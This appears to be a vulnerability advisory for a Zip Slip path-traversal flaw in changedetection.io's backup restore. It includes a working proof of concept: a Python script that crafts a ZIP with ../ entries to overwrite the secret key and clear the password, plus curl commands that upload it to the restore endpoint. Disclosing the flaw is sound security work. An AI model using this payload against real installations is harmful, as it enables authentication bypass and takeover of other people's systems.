summary: "changedetection.io has Zip Slip vulnerability in the backup restore functionality\n\
  ### Summary\nA Zip Slip vulnerability in the backup restore functionality allows arbitrary\
  \ file overwrite via path traversal in uploaded ZIP archives.\n\n### Details\n\nA Zip Slip\
  \ vulnerability in the backup restore functionality allows arbitrary file overwrite via path\
  \ traversal in uploaded ZIP archives. The application uses zipfile.extractall() without validating\
  \ entry paths, allowing ../ sequences to escape the extraction directory.\n\nVulnerable Code\
  \ (lines 50-53):\n```\ndef restore_backup(self, filename):\n    with zipfile.ZipFile(filename,\
  \ 'r') as zip_ref:\n        # VULNERABLE: No path validation before extraction\n        zip_ref.extractall(self.datastore_path)\n\
  ```\nThe extractall() function preserves the relative paths stored within the ZIP archive.\
  \ When a malicious ZIP contains entries with ../ path traversal sequences, these files are\
  \ extracted outside the intended directory.\n\n| Path in ZIP | Target File | Impact |\n| ---\
  \ | --- | --- |\n| ../secret.txt | Flask secret key | Session forgery, auth bypass |\n| ../changedetection.json\
  \ | App settings | Disable password, inject backdoor |\n| ../url-watches.json | Watch index\
  \ | Inject malicious watches |\n| ../{uuid}/watch.json | Watch config | Modify any watch |\n\
  \nAttacker uploads ZIP via the backup restore functionality at /backups/restore\nApplication\
  \ extracts files without validation, writing attacker content to sensitive locations\n\n\n\
  ### PoC\n\nStep 1: Create Malicious ZIP\n```\nimport zipfile\nimport json\n\nwith zipfile.ZipFile(\"\
  zipslip.zip\", \"w\") as zf:\n    # Escape extraction directory with ../\n    zf.writestr(\"\
  ../secret.txt\", \"ATTACKER-CONTROLLED-SECRET\")\n    \n    zf.writestr(\"../changedetection.json\"\
  , json.dumps({\n        \"settings\": {\"application\": {\"password\": \"\"}}\n    }))\n \
  \   \n    zf.writestr(\"../pwned-uuid-1234/watch.json\", json.dumps({\n        \"url\": \"\
  https://attacker.com/zipslip-pwned\",\n        \"title\": \"\U0001F534 ZIPSLIP-PROOF\"\n \
  \   }))\n```\nStep 2: Upload via Restore Endpoint\n\n```curl -X POST \"http://target:5000/backups/restore/start\"\
  \ \\\n  -F \"zip_file=@zipslip.zip\" \\\n  -F \"include_watches=y\" \\\n  -F \"include_settings=y\"\
  \ \n  ```\n\n###Step 3: Verify Path Traversal\n### Check if watch escaped to /datastore/\n\
  ###ls -la /datastore/\n### Look for: pwned-uuid-1234/\n\n### Verify in UI\n```curl \"http://target:5000/\"\
  \ | grep \"ZIPSLIP\"```\n\n\n<img width=\"1920\" height=\"1080\" alt=\"f_cBHEuvFcXsOiI-pcj1wJ9yzKCRM\"\
  \ src=\"https://github.com/user-attachments/assets/889e7d2b-b5fe-4658-aa88-e57995860d38\"\
  \ />"
